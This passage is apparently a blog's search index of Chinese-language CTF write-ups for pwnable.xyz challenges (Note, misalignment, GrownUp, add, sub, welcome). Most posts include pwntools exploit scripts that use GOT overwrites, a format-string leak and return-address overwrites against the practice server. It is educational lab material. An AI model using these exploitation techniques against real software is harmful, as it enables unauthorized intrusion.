&#39;,&#39;2&#39;)#sh.recvuntil(&#39;: &#39;)#gdb.attach(sh)sh.sendafter(&#39;: &#39;,payload)print(payload)#sh.recvuntil(&#39;&gt; &#39;)sh.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;)payload = &#39;4196764&#39;#sh.recvuntil(&#39;: &#39;)sh.sendlineafter(&#39;: &#39;,payload)#sh.recvuntil(&#39;&gt; &#39;)#gdb.attach(sh)sh.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)sh.interactive()</code></pre><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>方法二即按照题目思路，通过满足auth()函数的条件获得flag。</p><p><img src="https://i.loli.net/2019/09/12/l8hpWe6RCquALSj.png" alt="MarkDown"></p><p><code>s2</code>是全局变量 </p><p><img src="https://i.loli.net/2019/09/12/Cbcpi2Y1nhokurI.png" alt="MarkDown"></p><p>main() 即从<code>0x400B04</code> 到 <code>0x400B23</code>的内容</p><p><img src="https://i.loli.net/2019/09/12/mrv7etdOAulVYwk.png" alt="MarkDown"></p><p><em>注意</em></p><p>看auth()的运算式时一定要仔细，我就因为括号顺序看错直接整个式子就错了。是左边<code>a1[i]</code>经过运算之后再和<code>main[i]</code>异或得到<code>s2[i]</code>的值。</p><h3 id="方法二-EXP"><a href="#方法二-EXP" class="headerlink" title="方法二 EXP"></a>方法二 EXP</h3><pre><code class="python">#encoding:utf-8main = &#39;55 48 89 E5 48 83 EC 50 64 48 8B 04 25 28 00 00 00 48 89 45 F8 31 C0 E8 24 FE FF FF 48 8D 45 C0&#39;.split(&#39; &#39;)s2   = &#39;11 DE CF 10 DF 75 BB A5 43 1E 9D C2 E3 BF F5 D6 96 7F BE B0 BF B7 96 1D A8 BB 0A D9 BF C9 0D FF&#39;.split(&#39; &#39;)#print(main)#print(s2)result = []for i in range(32):    result.append( int(main[i],16) ^ int(s2[i],16) )ans = &#39;&#39;for i in range(32):    for j in range(256):        if(((j &gt;&gt; 4) | ( (16 * j) &amp; 0xff ) ) == result[i] ):            ans += chr(j)#特别注意： (16*j)需要 &amp; 0xff,因为16*j的结果很容易就&gt;256 之后结果一定不正确print(ans)from pwn import *context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./challenge&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30031)sh.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;)sh.sendlineafter(&#39;: &#39;,ans)sh.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz Note WriteUp</title>
      <link href="/2019/09/12/note/"/>
      <url>/2019/09/12/note/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的Note的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/DepwVgEmMrjNcnC.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/C1gbnhT5GUlcfPj.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/ykEMC2G7xQbXTpH.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/dQTXpF9oxqCBIz2.png" alt="MarkDown"></p><p>目标是触发win()函数。注意到，输入1进入的<code>edit_note()</code>函数可对全局变量<code>s</code>进行任意长度写，其中buf和s的距离是0x20，而输入2进入的 <code>edit_desc()</code>函数是从标准输入流写入<code>buf</code>内容所指的地址中，由此可以通过先输入1，将buf中内容覆写，再输入2，达到任意地址写的目的。</p><p>还有一点，因为该程序并未开启RELRO保护，因此可以进行GOT表覆写.</p><p><img src="https://i.loli.net/2019/09/12/lHm18kxzP2QNUcO.png" alt="MarkDown"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;flag = 0x40093celf = ELF(&#39;./challenge&#39;)puts_got = elf.got[&#39;puts&#39;]print(hex(puts_got))#puts_got = 0x601220sh = process(&#39;./challenge&#39;)#sh = remote(&#39;svc.pwnable.xyz&#39;,30016)sh.recvuntil(&#39;&gt; &#39;)payload = &#39;A&#39; * 32 + p64(puts_got)sh.sendline(&#39;1&#39;)sh.recvuntil(&#39;? &#39;)sh.sendline(&#39;52&#39;)sh.recvuntil(&#39;note: &#39;)sh.sendline(payload)sh.recvuntil(&#39;&gt; &#39;)sh.sendline(&#39;2&#39;)sh.recvuntil(&#39;desc: &#39;)sh.sendline(p64(flag))sh.recvuntil(&#39;&gt; &#39;)sh.sendline(&#39;123&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz misalignment WriteUp</title>
      <link href="/2019/09/12/misaligment/"/>
      <url>/2019/09/12/misaligment/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的misalignment的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/N7duFq2lIhxyGz8.png" alt="MarkDown"></p><p>目标很明确，使v5+7 == 0xB000000B5即可获得flag。</p><p><em>注意</em></p><ol><li><p>v6/v7/v8 是int64，占8字节，因此通过每次输入v8只能控制 <code>v5 - v5+7</code>  ,<code>v5+8 - v5+15</code>这两个范围的内容中的一个，因此需要分两次输入。</p></li><li><p>因为是小端序，因此从v5 + 7一直到 v5 + 14 中的值应该按次序为0xB5,0x00,0x00,0x00,0x0B,0x00,0x00,0x00.</p></li></ol><p>由此可得，第一次v8 = -6时，v6+v7应该 = 0xB500000000000000 特别地，因为刚好8字节，符号位又为1，因此输入的值应该为<code>-5404319552844595200</code>（从计算器中可得）</p><p><img src="https://i.loli.net/2019/09/12/6mIfwGd7FOVAqYx.png" alt="MarkDown"></p><p>同理，第二次v8 = -5 ，输入的值就是0x0B000000 = 184549376</p><p>运行脚本即可得flag。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./challenge&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30003)#sh.recv()#gdb.attach(sh)sh.sendline(&#39;-5404319552844595200 0 -6&#39;)sh.sendline(&#39;184549376 0 -5&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz GrownUp WriteUp</title>
      <link href="/2019/09/12/grownup/"/>
      <url>/2019/09/12/grownup/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的GrownUp的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/wQjiYqFezdTZ35o.png" alt="Markdown"></p><p>一开始，先用shift+F12发现flag字符串，赶忙提交后发现不对</p><p><img src="https://i.loli.net/2019/09/12/5YvpDJyMcxkes3a.png" alt="Markdown"></p><p>实际上是提示了我们服务器端的flag地址是0x601080</p><p>开始正经做题，似乎难以下手，但是注意到<code>printf(qword_601160, usr)</code>这一行可能有格式化字符串漏洞。</p><p>在gdb中发现<code>qword_601160</code>的值为0x601168</p><p><img src="https://i.loli.net/2019/09/12/pOMIb1GfBEog3FQ.png" alt="Markdown"></p><p>而<code>qword_601160</code>和<code>usr</code>的距离是0x80 = 128</p><pre><code>read(0, src, 0x80uLL)strcpy(usr, src);</code></pre><p>这两行乍一看也没有问题</p><p><em>关键</em>  ：strcpy()函数会在复制结束后在目标字符串后添加结束符<code>/x00</code> ；read()则不会。</p><p>由此，如果我们恰好对src输入128个字符，这样最后一个被添加到末尾的<code>/x00</code>就会溢出到0x601160，并且由于小端序，会覆盖原来的<code>/x68</code>，这样qword_601160的值就会被改为0x601100，是usr+32的地址，我们就可以利用格式化字符串漏洞泄露栈中内容了。如果我们之前曾经把flag的地址输入栈中，那么我们就可以用<code>%s</code>将其输出.</p><pre><code class="python">from pwn import * context.log_level = &#39;DEBUG&#39;sh = process(&#39;./GrownUpRedist&#39;)flag = 0x601080payload = &#39;&#39;payload += &#39;y&#39; * 8 + p64(flag)sh.recvuntil(&#39;Are you 18 years or older? [y/N]: &#39;)sh.send(payload)payload = &#39;&#39;payload = &#39;A&#39; * 32 + &#39;%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p &#39;length = len(payload)payload += &#39;A&#39; * (128 - length)sh.recvuntil(&#39;Name: &#39;)sh.sendline(payload)print(sh.recvall())sh.interactive()</code></pre><p>在试运行时发现</p><p><img src="https://i.loli.net/2019/09/12/w6KPeLyriD2tmOV.png" alt="Markdown"></p><p>第九个泄露的地址为flag地址0x601080，因此将脚本中的对应位置修改为<code>%s</code>即可得flag。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import * context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./GrownUpRedist&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30004)flag = 0x601080payload = &#39;&#39;payload += &#39;y&#39; * 8 + p64(flag)sh.recvuntil(&#39;Are you 18 years or older? [y/N]: &#39;)sh.send(payload)#这里如果是sendline()就会报错 原因不明payload = &#39;&#39;payload = &#39;A&#39; * 32 + &#39;%p,%p,%p,%p,%p,%p,%p,%p,%s,%p,%p,%p,%p,%p,%p &#39;#第九个位置如果用%p可以见到0x601080 就是flag的地址了 之后改成%s输出flaglength = len(payload)payload += &#39;A&#39; * (128 - length)#payload.ljust(128,&#39;A&#39;)#print(payload)sh.recvuntil(&#39;Name: &#39;)sh.sendline(payload)print(sh.recvall())sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz add WriteUP</title>
      <link href="/2019/08/08/add/"/>
      <url>/2019/08/08/add/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的add的WriteUP。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="http://i2.tiimg.com/696456/0f3701a7745115c4.png" alt="Markdown"></p><p>依旧是拖进IDA</p><p><img src="http://i2.tiimg.com/696456/745835338a81ed4f.png" alt="Markdown"></p><p><img src="http://i2.tiimg.com/696456/6cef7378623e6976.png" alt="Markdown"></p><p>注意到<code>win()</code>函数可获得flag，地址为0x400822 == 4196386。而<code>v7[v6] = v4 + v5</code>这一步可以任意覆写栈上内容，只要利用这个修改位于<code>rbp + 8</code>的ret地址，然后在第二次while循环时输入任意非数字字符使得<code>scanf()</code>返回值 != 3，在return时就可cat /flag 。</p><h2 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h2><p> v7 = rbp - 60h ; ret地址 = rbp + 8h ; 因此距离为0x68 = 104。值得注意的是v7数组类型是 <em>int64</em> ，占8个字节，所以 v6应该等于 104 / 8 == 13。  </p><p>另一边，v4 + v5 = win()函数的入口地址 = 4196386d即可。</p><h3 id="最终输入"><a href="#最终输入" class="headerlink" title="最终输入"></a>最终输入</h3><p>依旧不用写EXP</p><p>第一次循环 v4 = 4196385 v5 = 1 v6 =13</p><p>第二次循环，随便打个字母就行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz sub WriteUp</title>
      <link href="/2019/08/08/sub/"/>
      <url>/2019/08/08/sub/</url>
      
        <content type="html"><![CDATA[<p> pwnable.xyz上的白给题的wp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="http://i2.tiimg.com/696456/4df890822636f8f2.png" alt="Markdown">  </p><p>直接拖进IDA:</p><p><img src="http://i2.tiimg.com/696456/ae51a0863b07f649.png" alt="Markdown"></p><p>只要满足v4 - v5 == 4919即可。所以v4=4918，v5=-1就行了，连EXP都不用写。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz welcome WriteUp</title>
      <link href="/2019/08/07/pwnable-xyz-welcome-WriteUp/"/>
      <url>/2019/08/07/pwnable-xyz-welcome-WriteUp/</url>
      
        <content type="html"><![CDATA[<p>开始做pwnable.xyz上的题目了，记录下做题的思路。</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="http://i1.fuimg.com/696456/119eebdc5119a96f.png" alt="Markdown"></p><p>​        </p><p>​    下载后解压，试运行：</p><p><img src="http://i1.fuimg.com/696456/12e8d4e4025934aa.png" alt="Markdown"></p><p>​    拖进IDA中查看源码:  </p><p><img src="http://i1.fuimg.com/696456/186e0c53b922e2b4.png" alt="Markdown"></p><p>发现Leak给出的是v3的地址，而题目的目的是要将<code>*v3</code>的值改为<code>0</code>，这将会是一个突破口。在一开始我以为<code>malloc()</code>函数申请的两个空间是连续的，但在gdb中运行后发现并不如此。  </p><p><strong>关键点</strong></p><ol><li><p><code>malloc()</code>函数在申请空间失败时返回<code>NULL</code> ,且NULL == 0.</p></li><li><p><code>v5[size - 1]</code> == <code>*(v5 + (size-1) * sizeof(char) )</code>  </p></li></ol><p>因此当我们使得<code>malloc()</code>函数分配空间失败时，v5 == 0 ，就可以实现对<code>hex(size-1)</code>地址的赋值为0操作，即可获得flag。  </p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>from pwn import *sh = remote(&quot;svc.pwnable.xyz&quot;,30000)sh.recvuntil(&quot;Leak:&quot;)leak = sh.recvline()#print(leak)payload = str(int(leak,16) + 1)#print(payload)sh.recvuntil(&quot;Length of your message: &quot;)sh.sendline(payload)sh.recv()sh.sendline(&quot; &quot;)print(sh.recv())</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/08/03/hello-world/"/>
      <url>/2019/08/03/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
